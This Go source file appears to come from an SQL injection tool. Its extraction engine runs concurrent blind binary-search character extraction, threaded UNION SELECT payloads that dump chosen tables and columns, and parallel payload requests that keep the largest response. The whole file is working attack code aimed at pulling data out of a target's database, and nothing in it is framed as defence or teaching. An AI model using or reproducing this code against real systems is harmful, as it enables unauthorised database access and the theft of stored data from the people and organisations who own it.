package core

import (
	"fmt"
	"strings"
	"sync"
)

type CharResult struct {
	Pos   int
	Char  byte
	Found bool
	Err   error
}

func (e *Engine) BinarySearchChar(param string, queryTemplate string, pos int, ch chan<- CharResult, wg *sync.WaitGroup) {
	defer wg.Done()

	low, high := 32, 126
	for low <= high {
		mid := (low + high) / 2
		payload := fmt.Sprintf(queryTemplate, pos, mid)
		body, _, _, err := e.Request(payload, param)
		if err != nil {
			ch <- CharResult{Err: err}
			return
		}
		if len(body) > 100 {
			low = mid + 1
		} else {
			high = mid - 1
		}
	}

	if low >= 32 && low <= 126 {
		ch <- CharResult{Pos: pos, Char: byte(low), Found: true}
	} else {
		ch <- CharResult{Pos: pos, Found: false}
	}
}

func (e *Engine) FastBlindExtract(param string, queryTemplate string, maxLen int) string {
	var wg sync.WaitGroup
	ch := make(chan CharResult, maxLen)

	for i := 1; i <= maxLen; i++ {
		wg.Add(1)
		go e.BinarySearchChar(param, queryTemplate, i, ch, &wg)
	}

	go func() {
		wg.Wait()
		close(ch)
	}()

	posChars := make(map[int]byte)
	for res := range ch {
		if res.Found {
			posChars[res.Pos] = res.Char
		}
	}

	var result strings.Builder
	for i := 1; i <= maxLen; i++ {
		if c, ok := posChars[i]; ok {
			result.WriteByte(c)
		}
	}
	return result.String()
}

func (e *Engine) BulkExtractMultiThread(param string, dbms string, db string, tables []string, columns []string, threads int) []map[string]string {
	results := []map[string]string{}
	sem := make(chan struct{}, threads)
	var mu sync.Mutex
	var wg sync.WaitGroup

	comment := "--"
	if dbms == "MySQL" || dbms == "MariaDB" {
		comment = "-- "
	}

	for _, table := range tables {
		for _, col := range columns {
			wg.Add(1)
			sem <- struct{}{}
			go func(t string, c string) {
				defer wg.Done()
				defer func() { <-sem }()

				payload := fmt.Sprintf("' UNION SELECT %s FROM %s.%s %s", c, db, t, comment)
				body, _, _, err := e.Request(payload, param)
				if err != nil {
					return
				}
				data := strings.TrimSpace(body)

				mu.Lock()
				results = append(results, map[string]string{
					"table":  t,
					"column": c,
					"data":   data[:minInt(len(data), 500)],
				})
				mu.Unlock()
			}(table, col)
		}
	}
	wg.Wait()

	return results
}

func (e *Engine) ExtractWithTimeout(param string, payloads []string, timeout int) string {
	resultCh := make(chan string, len(payloads))

	for _, p := range payloads {
		go func(pay string) {
			body, _, _, err := e.Request(pay, param)
			if err != nil {
				resultCh <- ""
				return
			}
			resultCh <- body
		}(p)
	}

	best := ""
	for i := 0; i < len(payloads); i++ {
		select {
		case body := <-resultCh:
			if len(body) > len(best) {
				best = body
			}
		}
	}

	return best
}
